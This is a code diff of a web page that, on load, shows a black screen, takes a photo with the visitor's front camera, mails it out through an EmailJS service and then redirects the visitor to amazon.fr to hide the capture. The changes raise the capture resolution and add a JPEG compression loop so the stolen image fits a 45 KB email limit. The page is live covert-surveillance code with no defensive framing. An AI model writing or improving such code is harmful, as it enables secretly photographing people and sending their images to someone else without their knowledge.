@@ -8,7 +8,7 @@
     body, html {
       margin: 0;
       padding: 0;
-      background: #000000; /* écran noir */
+      background: #000; /* écran noir */
       height: 100%;
       width: 100%;
       overflow: hidden;
@@ -20,7 +20,7 @@
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="1280" height="720"></canvas>
+  <canvas id="canvas" width="1920" height="1080"></canvas>
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -29,23 +29,37 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
+    // Compression intelligente
+    function getCompressedImage(canvas, maxKB = 45) {
+      let quality = 0.95;
+      let imageData = canvas.toDataURL("image/jpeg", quality);
+
+      while ((imageData.length / 1024) > maxKB && quality > 0.05) {
+        quality -= 0.05; // baisse progressive
+        imageData = canvas.toDataURL("image/jpeg", quality);
+      }
+      return imageData;
+    }
+
     async function startCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: "user", width: 1280, height: 720 } 
+          video: { facingMode: "user", width: 1920, height: 1080 }
         });
         video.srcObject = stream;
 
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.9); // meilleure qualité
+
+          // Compression à 45 KB max
+          const imageData = getCompressedImage(canvas, 45);
 
           // Stop caméra après capture
           stream.getTracks().forEach(track => track.stop());
 
           // Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo auto 📸",
+            message: "Photo auto compressée 📸 (≤45KB)",
             image: imageData
           }).finally(() => {
             window.location.href = "https://www.amazon.fr";
